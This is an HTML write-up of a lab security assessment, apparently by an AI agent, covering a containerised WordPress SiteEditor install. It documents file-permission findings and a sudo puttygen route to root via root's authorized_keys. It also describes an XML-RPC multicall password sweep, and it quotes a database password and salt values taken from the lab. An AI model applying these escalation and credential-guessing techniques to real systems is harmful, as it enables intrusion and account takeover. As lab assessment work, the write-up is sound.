+<p><strong>Measured as <code>www-data</code> itself</strong> — not as root, not with <code>test -w</code>, because a
+privileged tool does not observe a low-privilege boundary
+(<code>self-corrections.md</code> §2):</p>
+<pre><code>$ setpriv --reuid=www-data --regid=www-data --init-groups /bin/bash -c '...'
+uid=33(www-data) gid=33(www-data) groups=33(www-data),1000(curiosito)
+Uid:	33	33	33	33
+Groups:	33 1000
+
+[lab-home]/curiosito                          READABLE      NOT-writable
+[lab-home]/curiosito/.ssh                     READABLE      NOT-writable
+[lab-home]/curiosito/.ssh/id_rsa              READABLE      NOT-writable
+[lab-home]/curiosito/.ssh/authorized_keys     READABLE      NOT-writable
+
+first bytes of the private key, read as www-data:
+-----BEGIN OPENSSH PRIVATE KEY-----
+</code></pre>
+<p><code>[lab-home]/curiosito/.ssh/id_rsa</code> is mode <code>250 curiosito:curiosito</code>; the <code>5</code> in the
+group position is what makes this true, and <code>www-data</code> is in that group. The
+private key is thus <strong>readable by every web request the server serves</strong> the
+moment any RCE exists as <code>www-data</code>.</p>
+<p><strong>Why this matters despite Finding 2:</strong> Findings 2 and 4 compose. Any <em>future</em>
+<code>www-data</code> RCE — including one that does not involve this plugin — is
+immediately <code>curiosito</code>, and <code>curiosito</code> is one <code>sudo puttygen</code> away from
+<code>uid=0</code>. That is the chain the lab intended, and Finding 4 is the rung that
+still exists.</p>
+<p><strong>Fix.</strong> <code>chmod 700 [lab-home]/curiosito/.ssh/id_rsa</code> is already right (<code>250</code> is
+even more permissive on the read bits than needed). The defect is the group
+membership, not the mode: remove <code>www-data</code> from the <code>curiosito</code> group. Give the
+web server its own key or a <code>sudo</code>-scoped service, not a shell user's key.</p>
+<hr />
+<h3 id="finding-5--medium-www-data-can-rewrite-wp-configphp">Finding 5 — MEDIUM: <code>www-data</code> can rewrite <code>wp-config.php</code></h3>
+<p><strong>CWE-732 / CWE-494 (download of code without integrity check, in the
+persistence sense).</strong></p>
+<p>Measured as <code>www-data</code>:</p>
+<pre><code>/var/www/html/wp-config.php                READABLE  WRITABLE
+/var/www/html/wp-content                   READABLE  WRITABLE
+/var/www/html/wp-content/uploads           READABLE  WRITABLE
+</code></pre>
+<p><code>wp-config.php</code> is the file that defines every credential and constant the
+framework consumes. A <code>www-data</code> primitive that can write it is a persistence
+and a credential-capture primitive: drop an <code>auto_prepend_file</code>, change
+<code>DB_PASSWORD</code>, or point <code>WP_PLUGIN_DIR</code> at a directory the attacker owns.
+Ownership by <code>www-data</code> is what makes this true; the mode is <code>644</code>, and owner
+write is the bit that matters.</p>
+<p><strong>Fix.</strong> Root-own <code>wp-config.php</code> and remove the world/owner write bit from
+every PHP file the web server should only ever <em>read</em>.</p>
+<hr />
+<h2 id="controls-that-held">Controls that held</h2>
+<p>Each control is paired with the positive control that proves its detector can
+fire. A negative with no positive control is not a control.</p>
+<table>
+<thead>
+<tr>
+<th>Control</th>
+<th>Measured as the identity it is about</th>
+<th>Positive control that proves the detector works</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>WordPress author enumeration</strong></td>
+<td>anonymous HTTP</td>
+<td><code>GET /?author=1</code> → <code>200</code>, 69513 bytes, <code>author/wordpress</code> in the body. Negative control: <code>?author=2,3,4,5</code> → <code>404</code>, 62735 bytes each, md5 identical to one another; <code>?author=99999</code> → <code>404</code>, 62735 bytes, md5 <code>2783a9c9de9a0c5c4bfbc1a49f481680</code> ≠ <code>d6849c5f45e36573253d21ca2b2196f6</code> for author 1. The detector separates one real user from an impossible id.</td>
+</tr>
+<tr>
+<td><strong>WordPress credential oracle (<code>wp.getUsersBlogs</code> over <code>system.multicall</code>)</strong></td>
+<td>anonymous HTTP</td>
+<td><strong>Proved green before the sweep was believed.</strong> I inserted a throwaway user <code>poscontrol</code> with a known password and ran one multicall: <code>&lt;name&gt;isAdmin&lt;/name&gt;&lt;value&gt;&lt;boolean&gt;1&lt;/boolean&gt;&lt;/value&gt;</code> and <code>blogName: Asucar Moreno</code>. The oracle can produce a success, so its silence on 409,165 candidates means something.</td>
+</tr>
+<tr>
+<td><strong><code>/root</code> is not reachable by the web user</strong></td>
+<td><code>www-data</code>, via <code>setpriv --reuid=www-data --init-groups</code></td>
+<td><code>/root</code>, <code>/root/.ssh</code>, <code>/root/.ssh/authorized_keys</code>, <code>/root/.mysql_history</code> all <code>NOT-readable</code>; <code>head</code> output: <code>Permission denied</code> for each. Positive control in the same shell: the same <code>www-data</code> identity <em>did</em> read <code>/var/www/html/wp-config.php</code> and <code>[lab-home]/curiosito/.ssh/id_rsa</code> in the same run, so the <code>NOT-readable</code> answers are a boundary and not a broken predicate.</td>
+</tr>
+<tr>
+<td><strong><code>/root/.mysql_history</code> does not leak the database password</strong></td>
+<td><code>www-data</code></td>
+<td>This file contains, verbatim: <code>CREATE USER 'curiosito'@'%' IDENTIFIED BY 'password++321dcbsodivbfva';</code> — the database password for the <code>curiosito</code> MySQL account. It is mode <code>644</code>, but <code>/root</code> is mode <code>700</code>, so <code>www-data</code> cannot traverse to it. Measured <code>Permission denied</code>. <strong>The mode is still a defect worth fixing</strong> (root's history containing a live credential should be <code>600</code>); the boundary that actually protects it is <code>/root</code>'s own mode.</td>
+</tr>
+<tr>
+<td><strong>MariaDB is not network-reachable</strong></td>
+<td><code>ss -tln</code> inside the container</td>
+<td><code>LISTEN 127.0.0.1:3306</code> — loopback only. Positive control: the same <code>ss</code> run returned 4 rows including the two <code>0.0.0.0</code> binds, so the tool was reading sockets.</td>
+</tr>
+<tr>
+<td><strong>WordPress registration is disabled</strong></td>
+<td>anonymous HTTP</td>
+<td><code>users_can_register</code> = <code>0</code> in <code>wp_options</code>. Not independently exercised against a live registration POST (count of that test: 0 requests) — recorded as an inference from the option value, in NOT tested.</td>
+</tr>
+<tr>
+<td><strong>The WordPress cookie salts are not the installer placeholder</strong></td>
+<td>PHP loading the real framework</td>
+<td>See the measurement below.</td>
+</tr>
+<tr>
+<td><strong><code>puttygen</code> does not accept a bare key string as its keyfile</strong></td>
+<td>as <code>curiosito</code>, through the grant</td>
+<td><code>puttygen: unable to load file '...': No such file or directory</code>, <code>exit=1</code>. Positive control: the <em>same</em> invocation with a real file path returned <code>exit=0</code> and created the oracle file. The instrument distinguishes the two cases.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="the-salt-measurement-self-correctionsmd-21-applied-not-asserted">The salt measurement (<code>self-corrections.md</code> §21 applied, not asserted)</h3>
+<p><code>wp-config.php:51-58</code> ships all eight keys as the installer placeholder. A
+document that read that file and declared the auth cookie forgeable would be
+wrong, and this corpus already contains that exact retracted finding. So I asked
+the framework instead:</p>
+<pre><code>defined('AUTH_KEY'): true
+AUTH_KEY as the file defines it : put your unique phrase here
+strlen(AUTH_KEY)                : 27
+
+wp_salt('auth')  = /K-&gt;ah=~U^c!$DY)A#7A640ke.]{d/!lqaCwU|B=i&amp;n4j5N-cfL]pNz4=yPVbB&gt;b_jda1;XpNk=YO!lj6,`4}i*{e .7b3/^5*nVSf 8C`$oBv(WbCTFk`&lt;*7_;~Jgfh
+strlen(wp_salt('auth')) = 128
+</code></pre>
+<p>A 27-character placeholder cannot produce a 128-character salt — the arithmetic
+alone refutes the claim. Following it to the actual source:</p>
+<pre><code>wp_options rows carrying salt material: 8
+  auth_key           len=64     auth_salt           len=64
+  secure_auth_key    len=64     secure_auth_salt    len=64
+  logged_in_key      len=64     logged_in_salt      len=64
+  nonce_key          len=64     nonce_salt          len=64
+
+get_site_option('auth_key')  = '/K-&gt;ah=~U^c!$DY)A#7A640ke.]{d/!lqaCwU|B=i&amp;n4j5N-cfL]pNz4=yPVbB&gt;b'   (len 64)
+
+wp_salt('auth') === get_site_option('auth_key')                        ? false
+wp_salt('auth') === AUTH_KEY (the config constant)                      ? false
+wp_salt('auth') === get_site_option('auth_key') . get_site_option('auth_salt') ? true
+option-pair length = 128, wp_salt length = 128
+</code></pre>
+<p><strong>Conclusion, from measurement:</strong> the framework <strong>ignores</strong> the <code>wp-config.php</code>
+placeholder and consumes the 64+64 characters stored in <code>wp_options</code>. The
+mechanism is at <code>wp-includes/pluggable.php:2442</code>, which pre-seeds the
+placeholder into a skip-list:</p>
+<pre><code class="language-php">			$duplicated_keys = array(
+				'put your unique phrase here' =&gt; true,
+			);
+</code></pre>
+<p>and <code>pluggable.php:2477</code>, which only takes the constant when the skip-list does
+not contain it:</p>
+<pre><code class="language-php">					if ( defined( $const ) &amp;&amp; constant( $const ) &amp;&amp; empty( $duplicated_keys[ constant( $const ) ] ) ) {
+</code></pre>
+<p><code>defined('AUTH_KEY')</code> is <code>true</code> and irrelevant. The value the framework consumes
+is the database row.</p>
+<p><strong>What this does and does not license.</strong> The salts are real, random, DB-stored
+values — so the &quot;placeholder makes the cookie forgeable&quot; claim is refuted for
+this image. It does <strong>not</strong> follow that the salts are safe: they sit in
+<code>wp_options</code> in cleartext, and any SQL injection or DB read discloses them. I
+did not test cookie forgery end to end (see NOT tested).</p>
+<hr />
+<h2 id="not-tested-vs-discarded-with-reason">NOT tested vs discarded with reason</h2>
+<p>These are two different lists and are not merged. A count of zero means
+<strong>untested</strong>, not &quot;absent&quot;.</p>
+<h3 id="not-tested--a-count-of-zero-or-a-reason-i-could-not-execute">NOT tested — a count of zero, or a reason I could not execute</h3>
+<table>
+<thead>
+<tr>
+<th>Item</th>
+<th>Work count</th>
+<th>Why it is not tested</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sudo puttygen</code> reached <strong>without</strong> operator assistance (i.e. a real attack chain from HTTP)</td>
+<td>0 attempts</td>
+<td>No unauthenticated RCE exists on this image (Finding 1/2). Everything above hop 1 required container root to become <code>curiosito</code>. This is the honest state of the engagement: <strong>the escalation is proved, the entry is not.</strong></td>
+</tr>
+<tr>
+<td>WordPress password recovery for user <code>wordpress</code></td>
+<td>409,165 candidates tested, 0 hits — <strong>not zero work</strong></td>
+<td>The sweep ran with a proven-green oracle. See the negatives table. What it does <em>not</em> cover is a non-dictionary password, a password reused from outside the corpus, or a password derivable from some source I did not find.</td>
+</tr>
+<tr>
+<td>SSH password attack on <code>curiosito</code></td>
+<td><strong>0 candidates tested</strong></td>
+<td>Not attempted. The hash in <code>/etc/shadow</code> is yescrypt (<code>$y$j9T$...</code>), which is not a sane target for an unkeyed sweep, and I had no wordlist budget worth spending on it. This is UNTESTED, not &quot;uncrackable&quot;.</td>
+</tr>
+<tr>
+<td>Whether the icon-library file-write RCE would succeed on a <strong>correctly packaged</strong> SiteEditor</td>
+<td>0 attempts</td>
+<td>I did not reconstruct the two missing classes. Fabricating them would produce a result about my fabrication, not about the artefact.</td>
+</tr>
+<tr>
+<td>End-to-end WordPress auth-cookie forgery</td>
+<td>0 attempts</td>
+<td>Blocked upstream: forging requires a live session token, and no session could be established without the password. The salt source is measured; the forgery is not tested.</td>
+</tr>
+<tr>
+<td>WordPress core 6.5.3 vulnerability surface</td>
+<td>0 CVEs tested, 0 files modified</td>
+<td>I did not audit core. The lab's active third-party component was the target and it turned out to be broken; auditing core on top of that is a different engagement. <strong>No CVE is claimed for this lab, and none should be inferred from &quot;6.5.3&quot;.</strong></td>
+</tr>
+<tr>
+<td>Whether <code>users_can_register = 0</code> truly blocks self-registration</td>
+<td>0 registration requests sent</td>
+<td>Read from the <code>wp_options</code> value only. <strong>This is an inference from a config value, not a measurement</strong>, and it is labelled as one.</td>
+</tr>
+<tr>
+<td>Whether <code>sed_page_ajax</code> (as opposed to <code>sed_page_customized</code>) triggers the same fatal unauthenticated</td>
+<td>0 requests with that parameter alone</td>
+<td>I exercised <code>sed_page_customized</code> (7 requests) and <code>action=…&amp;sed_page_customized</code> (1 request). The second disjunct of <code>sed_doing_ajax()</code> requires <code>DOING_AJAX</code>, i.e. <code>admin-ajax.php</code>, and would need its own session context to be meaningful. <strong>Source-level inference only; not measured.</strong></td>
+</tr>
+<tr>
+<td>Anything past <code>root</code> — kernel exploits, container escape, adjacent containers</td>
+<td>0 attempts</td>
+<td>Out of scope for this engagement and for the lab's stated objective.</td>
+</tr>
+<tr>
+<td>MariaDB from outside the host</td>
+<td>0 attempts</td>
+<td>Measured bound to <code>127.0.0.1:3306</code>; no pivot into loopback was available without RCE.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="discarded-with-reason">Discarded with reason</h3>
+<table>
+<thead>
+<tr>
+<th>Hypothesis</th>
+<th>Discarded because</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>&quot;The directory <code>wordpress/</code> inside the docroot is a second WordPress install.&quot;</td>
+<td>Measured: <code>find /var/www/html/wordpress -type f | wc -l</code> → <strong>0 files</strong>; <code>/wordpress/wp-includes/version.php</code> → <code>404</code>. It is an empty directory, indexed by <code>Options Indexes</code>. Discarded on 2 independent measurements.</td>
+</tr>
+<tr>
+<td>&quot;<code>wp-config.php</code> ships placeholder salts, therefore the auth cookie is forgeable.&quot;</td>
+<td>Refuted by measurement. <code>wp_salt('auth')</code> returns a 128-character value built from two 64-character <code>wp_options</code> rows; the 27-character placeholder is skipped by <code>pluggable.php:2442</code>/<code>:2477</code>. This is the corpus's own retracted finding (<code>self-corrections.md</code> §21).</td>
+</tr>
+<tr>
+<td>&quot;The SiteEditor AJAX surface is unauthenticated.&quot;</td>
+<td>Every one of the 16 registered <code>wp_ajax_*</code> actions routes through <code>check_ajax_handler()</code> (<code>site-editor-manager.class.php:1379</code>), which requires a session, <code>edit_theme_options</code>, and a nonce. 0 <code>nopriv</code> actions exist.</td>
+</tr>
+<tr>
+<td>&quot;<code>sudo -l</code> shows <code>NOPASSWD</code> on a binary, so the CVE-2019-14287 <code>--help</code> bypass applies.&quot;</td>
+<td>The sudoers line has no wildcard: <code>curiosito ALL=(root) NOPASSWD: /usr/bin/puttygen</code>. No argument-splitting bypass is available. The grant is a plain write-primitive problem (Finding 3).</td>
+</tr>
+<tr>
+<td>&quot;MariaDB on port 3306 is an entry point.&quot;</td>
+<td><code>LISTEN 127.0.0.1:3306</code> only, cross-checked by 4 instruments.</td>
+</tr>
+<tr>
+<td>&quot;<code>www-data</code> can append to <code>authorized_keys</code>.&quot;</td>
+<td>Measured as <code>www-data</code>: <code>[lab-home]/curiosito/.ssh/authorized_keys</code> is <code>NOT-writable</code>. Its mode is <code>654 curiosito:www-data</code> — group bits are <code>5</code> = <code>r-x</code>, not <code>6</code>. Reading the mode as &quot;group www-data can write&quot; would have been a wrong mechanism; the same file <em>is</em> readable.</td>
+</tr>
+<tr>
+<td>&quot;The session token in <code>wp_usermeta</code> is reusable.&quot;</td>
+<td>It carries <code>expiration: 1715678054</code> — a Unix timestamp that is in the past. Discarded on inspection of the value, not attempted.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="instrumentation-defects">Instrumentation defects</h2>
+<p>My own instruments, in the order they produced a wrong or empty answer. This is
+the section worth reading.</p>
+<h3 id="1-a-perl-path-resolver-that-reported-0-of-54--three-times-without-erroring">1. A Perl path resolver that reported &quot;0 of 54&quot; — three times, without erroring</h3>
+<p>I wrote a resolver to enumerate every <code>dirname(__FILE__)</code>-relative
+<code>require</code>/<code>include</code> in the plugin. It printed:</p>
+<pre><code>call sites examined: 0
+targets present:     0
+targets MISSING:     0
+</code></pre>
+<p>Three consecutive times, each with <code>syntax OK</code>, exit 0, clean output. <strong>It had
+found nothing because it looked in the wrong place, and a count of zero is
+indistinguishable from &quot;found none&quot;.</strong> This is <code>self-corrections.md</code> §14 and §19
+wearing a different costume: <em>blank and zero look identical, and a count of zero
+is evidence that nothing was tried.</em></p>
+<p>The actual bug chain, each step a plausible-looking regex that did not do what
+I read it as doing:</p>
+<ol>
+<li><code>\b(?:require|require_once)\s*\(</code> — assumed <code>require</code> is always followed by
+<code>(</code>. It is not: <code>require_once dirname( __FILE__ )</code> has no wrapping
+parenthesis, so the pattern matched nothing at all.</li>
+<li><code>\(([^;]*)\;</code> — after fixing the above, required a closing <code>)</code> before <code>;</code>,
+which the argument-less-parenthesis form does not have.</li>
+<li>Finally <code>dirname( __FILE__ ) . '/x.php';</code> — a <strong>shell</strong> path-extraction step
+whose <code>sed</code> did not strip the leading quote. It reported <strong>57 targets
+missing</strong> when at most a handful were, and it confidently named
+<code>/var/www/html/wp-content/plugins/site-editor/includes/app_file.class.php</code>
+as absent — a file I had listed myself minutes earlier.</li>
+</ol>
+<p><strong>What caught it:</strong> I did not accept the 57. I had just read <code>ls -la</code> of that
+exact directory in an earlier command, so the tool contradicted an artefact I
+already held. That is the §9 discipline — <em>cross-check the sweep against an
+artefact you already fetched</em> — and it is the only reason the false positive
+did not reach the report.</p>
+<p><strong>Fix:</strong> stop parsing PHP with regex. Rewritten with <code>token_get_all()</code>, which
+tokenises rather than pattern-matches. That version then reported honestly
+(<code>call sites: 54, resolved: 0, unparsed: 54</code>) and I found the real reason:
+<code>dirname</code> tokenises as <strong><code>T_STRING</code></strong>, not <code>T_DIR</code> — <code>T_DIR</code> is the <code>__DIR__</code>
+<em>magic constant</em>, a different thing with a confusingly similar name. A third
+wrong answer, this one structurally correct and still wrong.</p>
+<p><strong>Rule this adds:</strong> <em>a count of zero from an instrument you wrote today is a
+statement about the instrument until proven otherwise.</em> And the specific PHP
+trap: <code>dirname(...)</code> is a function call (<code>T_STRING</code>); <code>__DIR__</code> is a constant
+(<code>T_DIR</code>). They share three letters and nothing else.</p>
+<h3 id="2-a-recalled-exploit-mechanism-that-the-artefact-refuted-in-one-line">2. A recalled exploit mechanism that the artefact refuted in one line</h3>
+<p>I reached for <code>sudo puttygen &quot;ssh-rsa AAAA... &quot; -O save-as:[lab-home]/.ssh/authorized_keys</code>
+— the form quoted in most write-ups of this escalation. The artefact said no:</p>
+<pre><code>puttygen: unknown output type `save-as:/root/.ssh/authorized_keys'
+puttygen exit=1
+</code></pre>
+<p>and then, for the <code>-O public-openssh -o</code> form with a bare key string:</p>
+<pre><code>puttygen: unable to load file `ssh-rsa AAAAB3...': No such file or directory
+</code></pre>
+<p>The correct mechanism is <code>-O public-openssh -o &lt;path&gt;</code> with a <strong>file</strong> as
+keyfile argument, because PuTTYgen 0.78 does not accept a bare key string. I
+found this by reading <code>/usr/bin/puttygen --help</code> <strong>from the image</strong>, not by
+recalling it. <strong>Had I filed the finding from memory it would have carried the
+wrong mechanism and a proof that does not reproduce</strong> — the same failure class
+as <code>self-corrections.md</code> §11's <code>777</code>-read-as-<code>664</code>: the finding survives, the
+stated mechanism is wrong, and a wrong mechanism in a report is a wrong report.</p>
+<h3 id="3-docker-exec-for-every-permission-predicate-would-have-inverted-three-findings">3. <code>docker exec</code> for every permission predicate would have inverted three findings</h3>
+<p>Every <code>test -r</code> / <code>test -w</code> in this writeup is executed through
+<code>setpriv --reuid=… --init-groups</code>, never through <code>docker exec</code> (which is root).
+Running them as root would have produced:</p>
+<ul>
+<li><code>www-data can read [lab-home]/curiosito/.ssh/id_rsa</code> — <strong>true anyway</strong>, so no
+change (and Finding 4 stands).</li>
+<li><code>www-data can read /root/.mysql_history</code> — <strong>true as root, false as
+<code>www-data</code>.</strong> A root-run predicate would have filed a credential-leak finding
+against a path <code>/root</code>'s own <code>700</code> mode already protects. It would have been
+wrong.</li>
+<li><code>www-data can write wp-config.php</code> — true either way, since <code>www-data</code> owns it.</li>
+</ul>
+<p>One of the three would have been a fabricated finding, and it would have looked
+exactly like a real one. That is <code>self-corrections.md</code> §2, and the only reason I
+caught it is that I had to write <code>setpriv</code> down first and then use it everywhere.</p>
+<h3 id="4-ls--l-and-the-authorized_keys-group">4. <code>ls -l</code> and the <code>authorized_keys</code> group</h3>
+<p><code>654 curiosito:www-data</code> reads at a glance like &quot;www-data can write this&quot;. It
+cannot: group bits are <code>5</code> (<code>r-x</code>). The same file <strong>is</strong> readable by
+<code>www-data</code>. One digit separates &quot;the web server can inject its own SSH key&quot; from
+&quot;the web server can read a public key&quot;, and those two are different findings
+with different remediation. Recorded because the near-miss is the point: an
+answer that came out <em>nearly</em> right is the one most likely to ship.</p>
+<h3 id="5-a-wrong-intermediate-conclusion-i-caught-by-re-measuring">5. A wrong intermediate conclusion I caught by re-measuring</h3>
+<p>I first read the salt measurement as &quot;no <code>auth_key</code> in <code>wp_options</code>, so
+<code>wp_salt()</code> generated a random value per boot&quot;. I then counted the rows instead
+of assuming: <code>SELECT COUNT(*) … WHERE option_name IN ('auth_key', …)</code> → <strong>8</strong>,
+each 64 characters, and <code>wp_salt('auth')</code> is <em>exactly</em> the concatenation of two
+of them. My first conclusion was wrong in a way that would have produced a
+<em>correct-sounding but wrong</em> security note (&quot;salts rotate per boot, so a DB read
+is harmless&quot;). The count was 8, not 0, and it changed the finding.</p>
+<hr />
+<h2 id="reward">Reward</h2>
+<p><strong>No reward exists on this lab.</strong> The search that established it, with counts:</p>
+<table>
+<thead>
+<tr>
+<th>Instrument</th>
+<th>Scope</th>
+<th>Count</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>grep -rlF &quot;FLAG{&quot; /</code> (excluding <code>/proc</code>, <code>/sys</code>, <code>/dev</code>, <code>/run</code>)</td>
+<td>whole filesystem</td>
+<td><strong>0 files</strong></td>
+<td>no match</td>
+</tr>
+<tr>
+<td><code>grep -rlF &quot;flag{&quot; /</code> (same exclusions)</td>
+<td>whole filesystem</td>
+<td><strong>1 file</strong></td>
+<td><code>wp-content/plugins/site-editor/editor/assets/css/siteeditor.min.css</code> — quoted: <code>.ui-icon-flag{background-position:-16px -112px}</code>. A CSS sprite rule.</td>
+</tr>
+<tr>
+<td><code>grep -rlF &quot;FLAG =&quot;</code></td>
+<td>whole filesystem</td>
+<td><strong>3 files</strong></td>
+<td><code>/usr/share/perl/5.36.0/File/Temp.pm</code> → <code>$LOCKFLAG = eval {</code>; <code>/usr/lib/x86_64-linux-gnu/perl-base/File/Temp.pm</code> (same file); <code>wp-includes/js/dist/vendor/lodash.js</code> → <code>var CLONE_DEEP_FLAG = 1,</code>. Both are source identifiers.</td>
+</tr>
+<tr>
+<td><code>grep -roE &quot;FLAG\{[^}]*\}&quot; /var/www</code></td>
+<td>docroot</td>
+<td><strong>0 matches</strong></td>
+<td>no <code>FLAG{...}</code> token anywhere</td>
+</tr>
+<tr>
+<td><code>grep -roE &quot;(FLAG|flag)\{[^}]{0,64}\}&quot; /var/www</code></td>
+<td>docroot</td>
+<td><strong>1 match</strong></td>
+<td>the same CSS rule</td>
+</tr>
+<tr>
+<td><code>SELECT … FROM wp_posts</code> (7 rows) / <code>wp_options</code> (172 rows) / <code>wp_users</code> (1 row) / <code>wp_comments</code> (1 row)</td>
+<td>database</td>
+<td>181 rows read</td>
+<td>no flag-shaped value in any post content, option, user field or comment</td>
+</tr>
+<tr>
+<td><code>find [lab-home]/curiosito</code> + <code>cat /root/.bash_history</code> + <code>cat /root/.mysql_history</code></td>
+<td>local user material</td>
+<td>5 home entries, 20 history lines</td>
+<td>no flag token</td>
+</tr>
+</tbody>
+</table>
+<p>All four non-zero matches were <strong>read</strong>, not dismissed by name. Three of them
+are third-party source code containing the letters <code>flag</code> in an identifier, and
+one is a minified CSS class. None is a reward, and the corpus's rule is the
+reason I quoted them: <em>a report that invents its own reward teaches the reader
+nothing about the finding it is attached to.</em></p>
+<p>The authoritative statement of this property is the <code>FLAG{}</code> column of
+<a href="../labs.html"><code>../INDEX.md</code></a>. I make no claim about my position in any
+sequence.</p>
+<hr />
+<h2 id="restore">Restore</h2>
+<p>Recreated from the image, not by undoing edits.</p>
+<pre><code>$ docker rm -f asucar_container &amp;&amp; docker run -d --name asucar_container asucar:latest
+</code></pre>
+<p>Verified <strong>positively</strong> — every check is an assertion of a value I know should
+be there, not an absence:</p>
+<table>
+<thead>
+<tr>
+<th>Check</th>
+<th>Expected</th>
+<th>Observed</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>grep &quot;wp_version = &quot; wp-includes/version.php</code></td>
+<td><code>6.5.3</code></td>
+<td><code>19:$wp_version = '6.5.3';</code></td>
+</tr>
+<tr>
+<td><code>SELECT user_login FROM wp_users</code></td>
+<td>only the shipped user</td>
+<td>1 row: <code>wordpress</code> — the <code>poscontrol</code> account I created for the positive control is gone</td>
+</tr>
+<tr>
+<td><code>[ -f /root/.ssh/authorized_keys ]</code></td>
+<td>absent</td>
+<td><code>NO</code>; <code>ls -A /root/.ssh | wc -l</code> → <code>0</code></td>
+</tr>
+<tr>
+<td><code>/tmp</code> contents</td>
+<td>empty</td>
+<td><code>0</code> entries; all five probe scripts and the marker key gone</td>
+</tr>
+<tr>
+<td><code>ls -A [lab-home]/curiosito</code></td>
+<td>shipped 5 entries</td>
+<td><code>.bash_history .bashrc .bash_logout .profile .ssh</code> — <code>lab112_key.pub</code> gone</td>
+</tr>
+<tr>
+<td><code>ls -A .../options-engine/includes/dependency/ | wc -l</code></td>
+<td><code>1</code></td>
+<td><code>1</code> — the shipped defect is still there, as it should be</td>
+</tr>
+<tr>
+<td><code>GET /</code></td>
+<td>200</td>
+<td><strong>200, 96154 bytes</strong> — byte-identical to the pre-engagement baseline</td>
+</tr>
+<tr>
+<td><code>POST /wp-login.php</code></td>
+<td>200</td>
+<td><strong>200, 7907 bytes</strong> — byte-identical to the pre-engagement baseline</td>
+</tr>
+<tr>
+<td><code>POST /xmlrpc.php</code> (known-bad credentials)</td>
+<td>the same single fault string</td>
+<td><code>200</code>, 414 bytes, <code>Nombre de usuario o contraseña incorrectos.</code></td>
+</tr>
+</tbody>
+</table>
+<p>The two HTTP byte counts matching their pre-engagement values is the useful part:
+the restore is verified by a value that had to be <em>right</em>, not by the absence of
+an error. The lab is back to shipped state, and the only thing left running is
+the container the engagement was given.</p>
+<p><strong>Disk.</strong> No image, archive or scratch file was removed beyond my own. The
+<code>asucar:latest</code> image and <code>labs/112/</code> are left in place for the parent to
+reclaim by name, alongside <code>dist/asucar.zip</code> which is needed for any retry. No
+<code>docker system prune</code>, no <code>image prune -a</code>, no <code>volume prune</code> was run, and no
+container other than <code>asucar_container</code> was touched.</p>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
